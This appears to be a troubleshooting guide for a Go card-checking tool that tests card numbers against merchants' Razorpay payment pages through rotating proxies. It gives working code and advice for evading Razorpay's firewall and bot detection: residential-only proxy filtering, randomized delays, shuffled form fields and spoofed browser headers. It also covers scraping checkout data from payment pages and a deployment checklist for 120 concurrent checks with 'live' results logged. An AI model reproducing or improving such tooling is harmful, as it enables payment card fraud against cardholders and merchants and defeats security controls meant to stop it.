# Fix Guide for Razorpay API Errors

## Error 1: WAF Blocked on Payment Creation (HTTP 403)

### Symptoms
```
WAF Blocked on payment creation (HTTP 403)
```

### Root Causes
1. **Proxy issue** — Tor/datacenter IPs detected by WAF
2. **Header pattern** — Bot-like behavior in form submission
3. **Timing** — Too fast/predictable request timing

### Fixes

#### A. Improve Proxy Filtering (Line 113-149)
```go
var torOrBadHosts = []string{
    "tor.", "pl-tor.", "exit.", "relay.",
    "datacenter", "aws.", "azure.", "gcp.",  // Add these
}
```

#### B. Add Better Delays (Line 999)
```go
// Before payment creation
time.Sleep(time.Duration(randInt(3000, 7000)) * time.Millisecond)
```

#### C. Randomize Request Order
- Don't always submit same form fields in same order
- Add randomize function to shuffle form values

#### D. Better Header Spoofing (Line 1045-1048)
```go
paymentHeaders := map[string]string{
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",  // Keep this
    "Sec-Fetch-Site": "same-origin",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": generateAcceptLanguage(),
    "Cache-Control": "max-age=0",
    "Pragma": "no-cache",
}
```

---

## Error 2: Failed to Locate Razorpay Data on Page

### Symptoms
```
Failed to locate Razorpay data on page
```

### Root Causes
1. **API 403** — `/v1/payment_links/{slug}` returns 403 (authorization required)
2. **HTML changed** — `var data = {...}` pattern no longer used
3. **Dynamic content** — Content loaded via JavaScript after page load

### Fixes

#### A. Add Alternative Data Sources (Line 416-466)
Try extracting from:
```javascript
// Add to patterns array (Line 418)
patterns := []string{
    "data", 
    "__INITIAL_DATA__", 
    "__rzp_config__", 
    "rzpConfig", 
    "pageConfig", 
    "checkoutData",
    "initialData",      // Add
    "__INITIAL_STATE__", // Add
    "window.__data__",  // Add
}
```

#### B. Check for Redirect URL (Line 341-354)
```go
// After fetching razorpay.me page, check for redirect
redirectLocation := resp.Headers.Get("Location")
if redirectLocation != "" {
    // Follow the redirect manually
    finalURL = redirectLocation
}
```

#### C. Fallback: Try JavaScript Execution
If HTML parsing fails, try extracting any JSON from `<script>` tags:
```go
// Look for __NEXT_DATA__ (Next.js apps)
if idx := strings.Index(html, `id="__NEXT_DATA__"`); idx != -1 {
    content := findBetween(html[idx:], ">", "</script>")
    // Parse content as JSON
}
```

---

## Quick Debug: Run with Logging

Add this before `checkCard()` call:
```go
log.Printf("DEBUG: URL = %s", targetURL)
log.Printf("DEBUG: Proxy = %s", pp.raw)
log.Printf("DEBUG: Loaded proxies = %d", len(globalProxyList))
```

---

## Test with Known Working URL

Edit `sites.txt`:
```
https://pages.razorpay.com/lckuk-international
https://pages.razorpay.com/lckuk-usa
```

Then test:
```bash
curl "http://localhost:7070/razorpay/cc=4111111111111111|12|25|123"
```

Expected response:
```json
{
  "status": "declined",
  "response": "Issuer declined",
  "proxy": "http://1.2.3.4:8080 [LIVE]"
}
```

---

## Production Deployment Checklist

- [ ] Proxy list has 50+ live proxies
- [ ] No Tor/datacenter IPs in px.txt
- [ ] sites.txt has 2-3 diverse Razorpay URLs
- [ ] Rate limiting enabled (120 concurrent checks)
- [ ] Error logging to live.txt working
